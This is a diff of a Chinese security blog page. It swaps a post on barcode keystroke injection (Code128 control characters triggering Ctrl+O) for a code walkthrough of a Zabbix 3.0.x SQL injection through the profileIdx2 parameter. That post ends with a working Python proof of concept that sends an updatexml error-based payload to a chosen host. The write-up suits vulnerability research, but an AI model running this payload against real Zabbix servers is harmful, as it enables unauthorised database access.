@@ -30,7 +30,7 @@
 <link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="条码安全,漏洞," />
+  <meta name="keywords" content="zabbix," />
 
 
 
@@ -46,23 +46,17 @@
 
 
 
-<meta name="description" content="在GEEK PWN大会上，TK为大家演示了腾讯玄武实验室最近研究的新成果—badbarcode，也就是对条码中一些安全隐患的研究。其实关于条码及二维码的安全研究由来已久，本文主要为大家介绍一下badbarcode最基本的原理。
-乌云上有一篇关于二维码出现过的利用总结，链接地址：http://drops.wooyun.org/mobile/10775
-在badbarcode中，主要针对的是code1">
+<meta name="description" content="Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位、解决存在的各种问题。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="badbarcode浅析">
-<meta property="og:url" content="http://s0m30ne.github.io/2015/12/23/badbarcode浅析/index.html">
+<meta property="og:title" content="ZABBIX v2.2.x, 3.0.0-3.0.3 sql注入分析（附POC）">
+<meta property="og:url" content="http://s0m30ne.github.io/2016/08/31/ZABBIX-v2-2-x-3-0-0-3-0-3-sql注入分析（附POC）/index.html">
 <meta property="og:site_name" content="s0m30ne的博客">
-<meta property="og:description" content="在GEEK PWN大会上，TK为大家演示了腾讯玄武实验室最近研究的新成果—badbarcode，也就是对条码中一些安全隐患的研究。其实关于条码及二维码的安全研究由来已久，本文主要为大家介绍一下badbarcode最基本的原理。
-乌云上有一篇关于二维码出现过的利用总结，链接地址：http://drops.wooyun.org/mobile/10775
-在badbarcode中，主要针对的是code1">
-<meta property="og:image" content="http://7xp22c.com1.z0.glb.clouddn.com/badbarcode.PNG">
-<meta property="og:updated_time" content="2015-12-25T11:39:30.619Z">
+<meta property="og:description" content="Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位、解决存在的各种问题。">
+<meta property="og:image" content="http://7xp22c.com1.z0.glb.clouddn.com/zabbix.png">
+<meta property="og:updated_time" content="2016-08-31T14:32:42.522Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="badbarcode浅析">
-<meta name="twitter:description" content="在GEEK PWN大会上，TK为大家演示了腾讯玄武实验室最近研究的新成果—badbarcode，也就是对条码中一些安全隐患的研究。其实关于条码及二维码的安全研究由来已久，本文主要为大家介绍一下badbarcode最基本的原理。
-乌云上有一篇关于二维码出现过的利用总结，链接地址：http://drops.wooyun.org/mobile/10775
-在badbarcode中，主要针对的是code1">
+<meta name="twitter:title" content="ZABBIX v2.2.x, 3.0.0-3.0.3 sql注入分析（附POC）">
+<meta name="twitter:description" content="Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位、解决存在的各种问题。">
 
 
 
@@ -74,7 +68,7 @@
   };
 </script>
 
-  <title> badbarcode浅析 | s0m30ne的博客 </title>
+  <title> ZABBIX v2.2.x, 3.0.0-3.0.3 sql注入分析（附POC） | s0m30ne的博客 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -234,7 +228,7 @@
             
             
               
-                badbarcode浅析
+                ZABBIX v2.2.x, 3.0.0-3.0.3 sql注入分析（附POC）
               
             
           </h1>
@@ -243,14 +237,14 @@
         <div class="post-meta">
           <span class="post-time">
             发表于
-            <time itemprop="dateCreated" datetime="2015-12-23T21:27:57+08:00" content="2015-12-23">
-              2015-12-23
+            <time itemprop="dateCreated" datetime="2016-08-31T20:18:37+08:00" content="2016-08-31">
+              2016-08-31
             </time>
           </span>
           <span class="post-time">
             | 修改于
-            <time itemprop="dateCreated" datetime="2015-12-25T19:39:30+08:00" content="2015-12-25">
-              2015-12-25
+            <time itemprop="dateCreated" datetime="2016-08-31T22:32:42+08:00" content="2016-08-31">
+              2016-08-31
             </time>
           </span>
 
@@ -259,8 +253,8 @@
               &nbsp; | &nbsp; 分类于
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/漏洞解析/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞解析</span>
+                  <a href="/categories/漏洞分析/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞分析</span>
                   </a>
                 </span>
 
@@ -275,8 +269,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2015/12/23/badbarcode浅析/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2015/12/23/badbarcode浅析/" itemprop="commentsCount"></span>
+                <a href="/2016/08/31/ZABBIX-v2-2-x-3-0-0-3-0-3-sql注入分析（附POC）/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/31/ZABBIX-v2-2-x-3-0-0-3-0-3-sql注入分析（附POC）/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -298,9 +292,9 @@
           
             <div class="post-gallery-row">
               <a class="post-gallery-img fancybox"
-                 href="http://7xp22c.com1.z0.glb.clouddn.com/badbarcode.PNG" rel="gallery_cisj06hxm0015vwmqt36hejkh"
+                 href="http://7xp22c.com1.z0.glb.clouddn.com/zabbix.png" rel="gallery_cisj06hxr001fvwmqe3me0kac"
                  itemscope itemtype="http://schema.org/ImageObject" itemprop="url">
-                <img src="http://7xp22c.com1.z0.glb.clouddn.com/badbarcode.PNG" itemprop="contentUrl"/>
+                <img src="http://7xp22c.com1.z0.glb.clouddn.com/zabbix.png" itemprop="contentUrl"/>
               </a>
             
           
@@ -311,20 +305,328 @@
       
 
       
-        <span itemprop="articleBody"><p>在GEEK PWN大会上，TK为大家演示了腾讯玄武实验室最近研究的新成果—badbarcode，也就是对条码中一些安全隐患的研究。其实关于条码及二维码的安全研究由来已久，本文主要为大家介绍一下badbarcode最基本的原理。</p>
-<p>乌云上有一篇关于二维码出现过的利用总结，链接地址：<a href="http://drops.wooyun.org/mobile/10775" target="_blank" rel="external">http://drops.wooyun.org/mobile/10775</a></p>
-<p>在badbarcode中，主要针对的是code128协议，由于几乎所有的读码器都可以识别code128协议的条码，因此，此方法还是十分通用的。Code128码其实还分成三类，即128A、128B、128C。它们的区别就是对应的字符表不一样。那么code128码到底怎么读呢？请看下面的图：<br><img src="http://7xp22c.com1.z0.glb.clouddn.com/barcode.jpg" alt=""></p>
-<p>条码中从左往右是黑白相间的条形图，其中黑颜色的叫做“条”，用B表示，白颜色的叫做“空”，用S表示。条和空都有4种不同的宽度，我们将其从细到粗赋予1、2、3、4四个值。然后我们开始按照不同粗细的值来阅读上面的条码，结果如下：</p>
-<p>211232 112232 131123 331121 241112 214121 124211 2331112</p>
-<p>Code128码有一个头一个尾。尾用2331112来表示，这代表Code128已经结束；尾前面的6位是校验位，用于检查该条形码是否被正确编码；头有3种，分别是211412表示128A、211214表示128B、211232表示128C；其余的部分是6位为一个块。去掉头、尾以及校验码后就是下面这样：</p>
-<p>112232 131123 331121 241112 214121</p>
-<p>我们可以根据字符表读出该条码的具体内容，字符表如下所示：<br><img src="http://7xp22c.com1.z0.glb.clouddn.com/code128.PNG" alt=""></p>
-<p>根据头我们可以知道这个是Code128C型。C型码是纯数字的，每个块对应2位数字，查表可得：12 34 56 78 90</p>
-<p>要研究badbarcode，我们就要了解一下条码扫描仪是如何识别条码并对条码中的数据进行处理的。识别条码的原理在上面已经介绍过了，那么识别出其中的数据后扫码仪是如何工作的呢？其实大部分扫码仪是基于模仿键盘的机制进行工作的，也就是说在条码中读出数据后，机器会认为该数据是通过键盘输入的，从而在商品编号等信息框内输入商品信息。那么这样的话，我们可不可以通过控制条码信息来在电脑上执行命令呢？答案当然是可以的！在code128协议中，是支持ASCII控制字符的。也就是说在code128协议中对于输入的ASCII字符都会有一个控制字符与之对应，具体的对应情况请看下表：<br><img src="http://7xp22c.com1.z0.glb.clouddn.com/code2ascii.png" alt=""></p>
-<p>通过上表我们可以看到，针对不同的ASCII字符，都有一个CTRL+X(X代表任意键)与之对应，这样呢，我们就可以通过执行CTRL+O打开对话框，然后大家就可以使用各种方式执行cmd命令了。根据上面对code128协议的介绍，我们可以通过生成一个含有2114121341111341112331112信息的条码来执行CTRL+O命令。该信息表明此条码是128A类型的条码，其中包含ASCII字符SI，即对应着CTRL+O命令。生成该条码后，条码如下所示：<br><img src="http://7xp22c.com1.z0.glb.clouddn.com/CtrlO.png" alt=""></p>
-<p>扫码仪扫描过上面条码后就会打开一个如下窗口：<br><img src="http://7xp22c.com1.z0.glb.clouddn.com/win.png" alt=""></p>
-<p>以上只是badbarcode中最基础的内容，再次仅仅做一个简单的解析，更加精彩的攻击方式可以通过ADF技术自定义键盘输入来实现构造一段包含win+r命令的条码。具体关于ADF的技术原理在此就不做介绍了，有兴趣的可以自己进行进一步的研究。</p>
-</span>
+        <span itemprop="articleBody"><p>Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位、解决存在的各种问题。<br><a id="more"></a></p>
+<p>在系统默认开启guest账户登陆时，攻击者可以通过SQL注入获取系统权限进而进行下一步的攻击。在<code>jsrpc.php</code>以及<code>latest.php</code>两个文件中均存在sql注入漏洞，造成该sql注入的原因是在通过<code>insertDB()</code>函数向数据库中插入数据时未对参数进行有效过滤。</p>
+<p>本文以ZABBIX3.0.3为例对该漏洞进行分析，首先对<code>jsrpc.php</code>文件进行分析追踪。在该文件中，存在如下代码片段：</p>
+<pre><code>$requestType = getRequest(&apos;type&apos;, PAGE_TYPE_JSON);
+if ($requestType == PAGE_TYPE_JSON) {
+    $http_request = new CHttpRequest();
+    $json = new CJson();
+    $data = $json-&gt;decode($http_request-&gt;body(), true);
+}
+else {
+    $data = $_REQUEST;
+}
+
+...
+
+case &apos;screen.get&apos;:
+    $result = &apos;&apos;;
+    $screenBase = CScreenBuilder::getScreen($data);
+    if ($screenBase !== null) {
+        $screen = $screenBase-&gt;get();
+
+        if ($data[&apos;mode&apos;] == SCREEN_MODE_JS) {
+            $result = $screen;
+        }
+        else {
+            if (is_object($screen)) {
+                $result = $screen-&gt;toString();
+            }
+        }
+    }
+    break;
+
+...
+</code></pre><p>其中<code>$data</code>参数中存储了request请求参数，将其传入<code>CScreenBuilder::getScreen</code>后，我们跟入<code>getScreen</code>函数，可以看到如下代码：</p>
+<pre><code>class CScreenBuilder {
+
+    ...
+
+    public static function getScreen(array $options = []) {
+
+        if (!array_key_exists(&apos;resourcetype&apos;, $options)) {
+            $options[&apos;resourcetype&apos;] = null;
+
+            ...
+
+            if (array_key_exists(&apos;screenitem&apos;, $options) &amp;&amp; array_key_exists(&apos;resourcetype&apos;, $options[&apos;screenitem&apos;])) {
+                $options[&apos;resourcetype&apos;] = $options[&apos;screenitem&apos;][&apos;resourcetype&apos;];
+            }
+        }
+
+        if ($options[&apos;resourcetype&apos;] === null) {
+            return null;
+        }
+
+        // get screen
+        switch ($options[&apos;resourcetype&apos;]) {
+            case SCREEN_RESOURCE_GRAPH:
+                return new CScreenGraph($options);
+
+            case SCREEN_RESOURCE_SIMPLE_GRAPH:
+                return new CScreenSimpleGraph($options);
+
+            case SCREEN_RESOURCE_MAP:
+                return new CScreenMap($options);
+
+            case SCREEN_RESOURCE_PLAIN_TEXT:
+                return new CScreenPlainText($options);
+
+            case SCREEN_RESOURCE_HOSTS_INFO:
+                return new CScreenHostsInfo($options);
+
+            case SCREEN_RESOURCE_TRIGGERS_INFO:
+                return new CScreenTriggersInfo($options);
+
+            case SCREEN_RESOURCE_SERVER_INFO:
+                return new CScreenServerInfo($options);
+
+            case SCREEN_RESOURCE_CLOCK:
+                return new CScreenClock($options);
+
+            case SCREEN_RESOURCE_SCREEN:
+                return new CScreenScreen($options);
+
+            case SCREEN_RESOURCE_TRIGGERS_OVERVIEW:
+                return new CScreenTriggersOverview($options);
+
+            case SCREEN_RESOURCE_DATA_OVERVIEW:
+                return new CScreenDataOverview($options);
+
+            case SCREEN_RESOURCE_URL:
+                $options = self::appendTemplatedScreenOption($options);
+                return new CScreenUrl($options);
+
+            case SCREEN_RESOURCE_ACTIONS:
+                return new CScreenActions($options);
+
+            case SCREEN_RESOURCE_EVENTS:
+                return new CScreenEvents($options);
+
+            case SCREEN_RESOURCE_HOSTGROUP_TRIGGERS:
+                return new CScreenHostgroupTriggers($options);
+
+            case SCREEN_RESOURCE_SYSTEM_STATUS:
+                return new CScreenSystemStatus($options);
+
+            case SCREEN_RESOURCE_HOST_TRIGGERS:
+                return new CScreenHostTriggers($options);
+
+            case SCREEN_RESOURCE_HISTORY:
+                return new CScreenHistory($options);
+
+            case SCREEN_RESOURCE_CHART:
+                return new CScreenChart($options);
+
+            case SCREEN_RESOURCE_LLD_GRAPH:
+                $options = self::appendTemplatedScreenOption($options);
+                return new CScreenLldGraph($options);
+
+            case SCREEN_RESOURCE_LLD_SIMPLE_GRAPH:
+                $options = self::appendTemplatedScreenOption($options);
+                return new CScreenLldSimpleGraph($options);
+
+            case SCREEN_RESOURCE_HTTPTEST_DETAILS:
+                return new CScreenHttpTestDetails($options);
+
+            case SCREEN_RESOURCE_DISCOVERY:
+                return new CScreenDiscovery($options);
+
+            default:
+                return null;
+        }
+
+    }
+
+    ...
+</code></pre><p>可以看到，在该函数中根据传入的<code>resourcetype</code>不同会实例化不同的类，而这些类的基类均为<code>CScreenBase</code>类。我们跟踪到<code>CScreenBase</code>类的构造函数中可以看到下面的代码：</p>
+<pre><code>class CScreenBase {
+
+    ...
+
+    public $profileIdx;
+
+    public $profileIdx2;
+
+    ...
+
+    public function __construct(array $options = []) {
+        ...
+
+        foreach ($this-&gt;parameters as $pname =&gt; $default_value) {
+            if ($this-&gt;required_parameters[$pname]) {
+                $this-&gt;$pname = array_key_exists($pname, $options) ? $options[$pname] : $default_value;
+            }
+        }
+
+        ...
+
+        // Calculate timeline.
+        if ($this-&gt;required_parameters[&apos;timeline&apos;] &amp;&amp; $this-&gt;timeline === null) {
+            $this-&gt;timeline = $this-&gt;calculateTime([
+                &apos;profileIdx&apos; =&gt; $this-&gt;profileIdx,
+                &apos;profileIdx2&apos; =&gt; $this-&gt;profileIdx2,
+                &apos;updateProfile&apos; =&gt; $this-&gt;updateProfile,
+                &apos;period&apos; =&gt; array_key_exists(&apos;period&apos;, $options) ? $options[&apos;period&apos;] : null,
+                &apos;stime&apos; =&gt; array_key_exists(&apos;stime&apos;, $options) ? $options[&apos;stime&apos;] : null
+            ]);
+        }
+
+        ...
+    }
+
+    public static function calculateTime(array $options = []) {
+        ...
+
+        if ($options[&apos;updateProfile&apos;] &amp;&amp; !empty($options[&apos;profileIdx&apos;])) {
+            CProfile::update($options[&apos;profileIdx&apos;].&apos;.period&apos;, $options[&apos;period&apos;], PROFILE_TYPE_INT, $options[&apos;profileIdx2&apos;]);
+        }
+
+        ...
+
+    }
+}
+</code></pre><p>可以看到，在构造函数中将传入的参数带入<code>calculateTime</code>函数，在该函数中再调用<code>CProfile::update</code>并传入用户可控的参数。接下来再进入<code>CProfile::update</code>，有如下代码：</p>
+<pre><code>public static function update($idx, $value, $type, $idx2 = 0) {
+    if (is_null(self::$profiles)) {
+        self::init();
+    }
+
+    if (!self::checkValueType($value, $type)) {
+        return;
+    }
+
+    $profile = [
+        &apos;idx&apos; =&gt; $idx,
+        &apos;value&apos; =&gt; $value,
+        &apos;type&apos; =&gt; $type,
+        &apos;idx2&apos; =&gt; $idx2
+    ];
+
+    $current = self::get($idx, null, $idx2);
+    if (is_null($current)) {
+        if (!isset(self::$insert[$idx])) {
+            self::$insert[$idx] = [];
+        }
+        self::$insert[$idx][$idx2] = $profile;
+    }
+    else {
+        if ($current != $value) {
+            if (!isset(self::$update[$idx])) {
+                self::$update[$idx] = [];
+            }
+            self::$update[$idx][$idx2] = $profile;
+        }
+    }
+
+    if (!isset(self::$profiles[$idx])) {
+        self::$profiles[$idx] = [];
+    }
+
+    self::$profiles[$idx][$idx2] = $value;
+}
+</code></pre><p>在上面的代码中，将用户传入的参数赋值给了<code>self::$insert</code>，而在<code>jsrpc.php</code>文件最后会包含<code>page_footer.php</code></p>
+<pre><code>require_once dirname(__FILE__).&apos;/include/page_footer.php&apos;;
+</code></pre><p>在该文件中会执行<code>CProfile::flush()</code>如下所示：</p>
+<pre><code>if (CProfile::isModified()) {
+    DBstart();
+    $result = CProfile::flush();
+    DBend($result);
+}
+</code></pre><p>继续查看<code>CProfile::flush()</code>如下：</p>
+<pre><code>public static function flush() {
+    $result = false;
+
+    if (self::$profiles !== null &amp;&amp; self::$userDetails[&apos;userid&apos;] &gt; 0 &amp;&amp; self::isModified()) {
+        $result = true;
+
+        foreach (self::$insert as $idx =&gt; $profile) {
+            foreach ($profile as $idx2 =&gt; $data) {
+                $result &amp;= self::insertDB($idx, $data[&apos;value&apos;], $data[&apos;type&apos;], $idx2);
+            }
+        }
+
+        ksort(self::$update);
+        foreach (self::$update as $idx =&gt; $profile) {
+            ksort($profile);
+            foreach ($profile as $idx2 =&gt; $data) {
+                $result &amp;= self::updateDB($idx, $data[&apos;value&apos;], $data[&apos;type&apos;], $idx2);
+            }
+        }
+    }
+
+    return $result;
+}
+</code></pre><p>在该函数中可以看到<code>self::$insert</code>中的数据被传入了<code>self::insertDB</code>函数，在<code>self::insertDB</code>中未对用户传入的<code>profileIdx2</code>参数进行任何检查直接带入了sql查询中,从而造成了sql注入。如下所示：</p>
+<pre><code>private static function insertDB($idx, $value, $type, $idx2) {
+    $value_type = self::getFieldByType($type);
+
+    $values = [
+        &apos;profileid&apos; =&gt; get_dbid(&apos;profiles&apos;, &apos;profileid&apos;),
+        &apos;userid&apos; =&gt; self::$userDetails[&apos;userid&apos;],
+        &apos;idx&apos; =&gt; zbx_dbstr($idx),
+        $value_type =&gt; zbx_dbstr($value),
+        &apos;type&apos; =&gt; $type,
+        &apos;idx2&apos; =&gt; $idx2
+    ];
+
+    return DBexecute(&apos;INSERT INTO profiles (&apos;.implode(&apos;, &apos;, array_keys($values)).&apos;) VALUES (&apos;.implode(&apos;, &apos;, $values).&apos;)&apos;);
+}
+</code></pre><p>而在<code>last.php</code>文件中有如下代码，也是将用户传入的参数传入了<code>CProfile::update</code>函数，有如下代码：</p>
+<pre><code>if (hasRequest(&apos;favobj&apos;)) {
+    if ($_REQUEST[&apos;favobj&apos;] == &apos;toggle&apos;) {
+        // $_REQUEST[&apos;toggle_ids&apos;] can be single id or list of ids,
+        // where id xxxx is application id and id 0_xxxx is 0_ + host id
+        if (!is_array($_REQUEST[&apos;toggle_ids&apos;])) {
+            if ($_REQUEST[&apos;toggle_ids&apos;][1] == &apos;_&apos;) {
+                $hostId = substr($_REQUEST[&apos;toggle_ids&apos;], 2);
+                CProfile::update(&apos;web.latest.toggle_other&apos;, $_REQUEST[&apos;toggle_open_state&apos;], PROFILE_TYPE_INT, $hostId);
+            }
+            else {
+                $applicationId = $_REQUEST[&apos;toggle_ids&apos;];
+                CProfile::update(&apos;web.latest.toggle&apos;, $_REQUEST[&apos;toggle_open_state&apos;], PROFILE_TYPE_INT, $applicationId);
+            }
+        }
+        else {
+            foreach ($_REQUEST[&apos;toggle_ids&apos;] as $toggleId) {
+                if ($toggleId[1] == &apos;_&apos;) {
+                    $hostId = substr($toggleId, 2);
+                    CProfile::update(&apos;web.latest.toggle_other&apos;, $_REQUEST[&apos;toggle_open_state&apos;], PROFILE_TYPE_INT, $hostId);
+                }
+                else {
+                    $applicationId = $toggleId;
+                    CProfile::update(&apos;web.latest.toggle&apos;, $_REQUEST[&apos;toggle_open_state&apos;], PROFILE_TYPE_INT, $applicationId);
+                }
+            }
+        }
+    }
+}
+</code></pre><p>后面的过程与前面分析相同，就不再赘述了，下面附上poc（仅供参考，请勿用于非法用途，由此引发的任何后果与作者无关）。</p>
+<pre><code>import requests
+import re
+import sys
+
+host = sys.argv[1]
+base_url = &quot;{host}/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=2 {payload}&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&quot;
+
+def get_data(content):
+    result = re.findall(r&quot;XPATH syntax error: &apos;~(.+?)~&apos;&quot;, content)
+    if result:
+        return result[0]
+    else:
+        return False
+
+def confirm():
+    payload = &quot;or updatexml(1,concat(0x7e,(version()),0x7e),0) or&apos;&apos;&quot;
+    res = requests.get(base_url.format(host = host, payload = payload))
+    result = get_data(res.text)
+    if result:
+        print &quot;{host} is vul&quot;.format(host = host)
+
+if __name__ == &apos;__main__&apos;:
+    confirm()
+</code></pre></span>
       
     </div>
 
@@ -332,9 +634,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/条码安全/" rel="tag">#条码安全</a>
-          
-            <a href="/tags/漏洞/" rel="tag">#漏洞</a>
+            <a href="/tags/zabbix/" rel="tag">#zabbix</a>
           
         </div>
       
@@ -343,17 +643,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/12/23/利用Censys批量获取Juniper-Netscreen后门/" rel="next" title="利用Censys批量获取Juniper Netscreen后门">
-                <i class="fa fa-chevron-left"></i> 利用Censys批量获取Juniper Netscreen后门
+              <a href="/2016/07/18/一款轻量级漏洞批量检测框架-s0m3poc/" rel="next" title="一款轻量级漏洞批量检测框架-s0m3poc">
+                <i class="fa fa-chevron-left"></i> 一款轻量级漏洞批量检测框架-s0m3poc
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/01/01/利用phpStudy批量获取shell/" rel="prev" title="利用phpStudy探针批量获取shell">
-                利用phpStudy探针批量获取shell <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -380,8 +676,8 @@
         
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2015/12/23/badbarcode浅析/"
-           data-title="badbarcode浅析" data-url="http://s0m30ne.github.io/2015/12/23/badbarcode浅析/">
+      <div class="ds-thread" data-thread-key="2016/08/31/ZABBIX-v2-2-x-3-0-0-3-0-3-sql注入分析（附POC）/"
+           data-title="ZABBIX v2.2.x, 3.0.0-3.0.3 sql注入分析（附POC）" data-url="http://s0m30ne.github.io/2016/08/31/ZABBIX-v2-2-x-3-0-0-3-0-3-sql注入分析（附POC）/">
       </div>
     
   </div>
